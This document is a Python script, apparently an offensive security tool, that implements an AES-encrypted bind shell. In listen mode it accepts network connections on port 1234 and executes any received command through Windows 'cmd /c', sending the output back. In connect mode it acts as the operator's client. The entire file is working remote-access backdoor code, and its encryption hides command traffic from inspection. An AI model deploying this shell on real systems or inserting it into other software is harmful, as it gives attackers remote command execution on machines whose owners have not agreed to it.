import socket
import subprocess
import argparse
import threading
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad

DEFAULT_PORT = 1234
MAX_BUFFER = 4096

class AESCipher:
    def __init__(self, key=None):
        self.key = key if key else get_random_bytes(32)
        self.cipher = AES.new(self.key, AES.MODE_ECB)

    def encrypt(self, plaintext):
        return self.cipher.encrypt(pad(plaintext, AES.block_size)).hex()

    def decrypt(self, encrypted):
        return unpad(self.cipher.decrypt(bytearray.fromhex(encrypted)), AES.block_size)

    def __str__(self):
        return "key -> {}".format(self.key.hex())


def encrypted_send(s, msg):
    s.send(cipher.encrypt(msg).encode("latin-1"))


def execute_cmd(cmd):
    try:
        output = subprocess.check_output("cmd /c {}".format(cmd), stderr=subprocess.STDOUT)
    except subprocess.CalledProcessError as e:
        output = e.output  
    return output


def decode_and_strip(data):
    return data.decode("latin-1").strip()


def shell_thread(s):
    encrypted_send(s, b"[ -- CONNECTED --  !!]")

    try:
        while True:
            encrypted_send(s, b"\n\rENTER COMMAND>")

            data = s.recv(MAX_BUFFER)

            if data:
                
                data = data.decode("latin-1")  
                
                
                buffer = cipher.decrypt(data).decode("latin-1")
                
                
                buffer = buffer.strip()
                
                if not buffer or buffer == "exit":
                    s.close()
                    exit()

                print(f"Executing command {buffer} !>")
                
                
                encrypted_send(s, execute_cmd(buffer))

    except Exception as e:
        print(f"Error in shell_thread: {e}")  
        s.close()
        exit()



def send_thread(s):
    try:
        while True:
            data = input() + "\n"
            encrypted_send(s, data.encode("latin-1"))
    except Exception as e:
        print(f"Error in send_thread: {e}")  
        s.close()
        exit()


def recv_thread(s):
    try:
        while True:
            data = s.recv(MAX_BUFFER)  
            if data:
                data = decode_and_strip(data)  
                data = cipher.decrypt(data).decode("latin-1")
                print(data, end="", flush=True)
    except Exception as e:
        print(f"Error in recv_thread: {e}")  
        s.close()
        exit()


def server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", DEFAULT_PORT))
    s.listen()

    print("[-- Starting Bind Shell --!]")

    while True:
        client_socket, addr = s.accept()
        print(f"[-- new user connected from {addr} --]")
        threading.Thread(target=shell_thread, args=(client_socket,)).start()


def client(ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, DEFAULT_PORT))

    print("[-- connecting to bind shell --]")

    threading.Thread(target=send_thread, args=(s,)).start()
    threading.Thread(target=recv_thread, args=(s,)).start()


parser = argparse.ArgumentParser()
parser.add_argument("-l", "--listen", action="store_true", help="to listen to the shell", required=False)
parser.add_argument("-c", "--connect", help="connect to bind shell", required=False)
parser.add_argument("-k", "--key", type=str, help="Encryption key", required=False)
args = parser.parse_args()

if args.connect and not args.key:
    parser.error("-c connect requires -k key!")

if args.key:
    cipher = AESCipher(bytearray.fromhex(args.key))
else:
    cipher = AESCipher()

print(cipher)

if args.listen:
    server()
elif args.connect:
    client(args.connect)
